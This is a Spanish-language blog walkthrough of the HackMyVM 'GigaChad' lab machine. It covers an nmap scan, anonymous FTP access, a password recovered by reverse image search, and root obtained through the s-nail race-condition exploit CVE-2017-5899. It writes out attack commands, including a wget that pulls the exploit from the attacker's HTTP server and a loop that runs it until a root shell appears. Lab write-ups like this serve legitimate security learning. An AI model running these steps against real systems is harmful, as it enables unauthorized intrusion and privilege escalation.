---
layout: post
title: GigaChad
date: 2023-05-21
author: BlackCage
categories: [HackMyVM]
tags: [HMV, FTP, OSINT, CVE]
---

# GigaChad [ Hack My VM ]
![light mode only](/assets/img/imgs/gigachad/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/gigachad/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Sun May 21 12:39:49 2023 as: nmap -sCV -p21,22,80 -oN targeted 192.168.1.115
Nmap scan report for 192.168.1.115
Host is up (0.00065s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.106
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6afed61723cb90792bb12d3753974658 (RSA)
|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/kingchad.html
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 21 12:40:13 2023 -- 1 IP address (1 host up) scanned in 24.55 seconds
```

Vemos que el puerto `22` está abierto, pero no tenemos ningún usuaio para poder conectarnos, por suerte vemos que nos permiten la entrada anónima por **`FTP`**.

### Inspección
Vamos a ver qué encontramos si entramos como anónimos en el servidor **`FTP`**:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/GigaChad/content]
└─# ftp 192.168.1.115
Connected to 192.168.1.115.
220 (vsFTPd 3.0.3)
Name (192.168.1.115:root): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||47637|)
150 Here comes the directory listing.
dr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 .
dr-xr-xr-x    2 1000     1000         4096 Feb 07  2021 ..
-r-xr-xr-x    1 1000     1000          297 Feb 07  2021 chadinfo
226 Directory send OK.
```

Vemos uun fichero llamado `chadinfo`, vamos a descargarlo y ver qué contiene:

```sh
ftp> get chadinfo
local: chadinfo remote: chadinfo
229 Entering Extended Passive Mode (|||61111|)
150 Opening BINARY mode data connection for chadinfo (297 bytes).
100% |******************************************************************************************|   297      101.66 KiB/s    00:00 ETA
226 Transfer complete.
297 bytes received in 00:00 (77.86 KiB/s)
ftp> exit
221 Goodbye.
```

Realmente es un fichero **`ZIP`**, pero si le hacemos un **`cat`** podemos ver su contenido:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/GigaChad/content]
└─# cat chadinfo
PK
0
 HR��▒ƃchadinfoUT       �j `Zj `ux
                                  why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png
PK
0
 HR��▒ƃ▒��chadinfoUT�j `ux
                          PKN�
```

Nos están dando un nombre de usuario y una ruta que lleva a una imagen, vamos a verla:

![drippinchad](/assets/img/imgs/gigachad/drippinchad.png)

¡Bien! Ya tenemos algo con lo que trabajar, pasemos al siguiente paso.

# Movimiento Lateral
### Shell
Si miramos la imagen, al principio no tiene mucho sentido, pero si recordamos la nota encontrada nos está diciendo que la contraseña está en esta imagen.

Para encontrar la contraseña utilizaremos **`OSINT`** básico, haremos una búsqueda inversa de la imagen, en mi caso utilizaré [Google Images](https://images.google.com):

![osint](/assets/img/imgs/gigachad/osint.png)

Como vemos, tras recortar un poco la imagen, nos sale un resultado: **`Maiden's Tower`**. Vamos a probar esto como contraseña. Recordad que el usuario es **`chad`**:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/GigaChad]
└─# ssh chad@192.168.1.115
chad@192.168.1.115's password: maidenstower
Linux gigachad 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun May 21 11:56:59 2023 from 192.168.1.106
chad@gigachad:~$
```

¡Perfecto! Ya estamos como `Chad` en la máquina, un paso más cerca de conseguir el **control total** de la máquina.

### Subida de privilegios
Para obtener `root` comenzaré por enumerar los ficheros con permisos `SUID` de la máquina:

```sh
chad@gigachad:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/s-nail/s-nail-privsep
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chsh
```

Entre todos estos binarios vemos uno que no es demasiado común, estamos hablando del binario **`s-nail-privsep`**, vamos a ver si encontramos alguna vulnerabilidad:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/GigaChad]
└─# searchsploit s-nail        
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
S-nail < 14.8.16 - Local Privilege Escalation                                                        | multiple/local/47172.sh
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Haciendo uso de la herramienta **`searchsploit`** hemos encontrado un exploit que sirve para este binario, aunque es importante recalcar que solo sirve para la versión `14.8.16` o anterior, vamos a ver qué versión tiene el nuestro:

```sh
chad@gigachad:~$ s-nail -V
v14.8.6
```

¡Estupendo! Vemos que este exploit puede funcionar, vamos a copiarlo y a llevarlo a la máquina víctima:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/GigaChad/exploits]
└─# searchsploit -m multiple/local/47172.sh
  Exploit: S-nail < 14.8.16 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/47172
     Path: /usr/share/exploitdb/exploits/multiple/local/47172.sh
    Codes: CVE-2017-5899
 Verified: False
File Type: POSIX shell script, ASCII text executable
Copied to: /root/Desktop/VMs/HMV/GigaChad/exploits/47172.sh
```

Ahora tenemos que montarnos un servidor `HTTP` con `Python` para llevarlo a la máquina:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/GigaChad/exploits]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Por último tenemos que irnos a la máquina víctima y descarganos el exploit, en mi caso lo haré en la carpeta `/tmp/`{: .filepath }.

```sh
chad@gigachad:/tmp$ wget http://192.168.92.128/47172.sh
--2023-05-21 13:10:11--  http://192.168.92.128/47172.sh
Connecting to 192.168.92.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8479 (8.3K) [text/x-sh]
Saving to: ‘47172.sh’

47172.sh                      100%[=================================================>]   8.28K  --.-KB/s    in 0s

2023-05-22 13:10:11 (241 MB/s) - ‘47172.sh’ saved [8479/8479]
```

Una vez lo tengamos en la máquina víctima debemos darle permisos de ejecución:

```sh
chad@gigachad:/tmp$ chmod +x 47172.sh
```

Ahora podemos iniciarlo, pero a mí no me funcionó a la primera, por lo que tuve que crear un `loop` infinito. Esto es debido a que este exploit funciona con condiciones de carrera:

```sh
chad@gigachad:/tmp$ while true; do ./47172.sh; done
```

Tras un rato de espera conseguimos la `shell` como `root`:

```sh
[.] Race #974 of 1000 ...
This is a helper program of "s-nail" (in /usr/bin).
  It is capable of gaining more privileges than "s-nail"
  and will be used to create lock files.
  It's sole purpose is outsourcing of high privileges into
  fewest lines of code in order to reduce attack surface.
  It cannot be run by itself.
[.] Race #975 of 1000 ...
[+] got root! /var/tmp/.sh (uid=0 gid=0)
[.] Cleaning up...
[+] Success:
-rwsr-xr-x 1 root root 14424 May 22 07:13 /var/tmp/.sh
[.] Launching root shell: /var/tmp/.sh
# whoami
root
#
```

¡Enhorabuena! Hemos conseguido el **control total** de la máquina. ¡Qué fácil!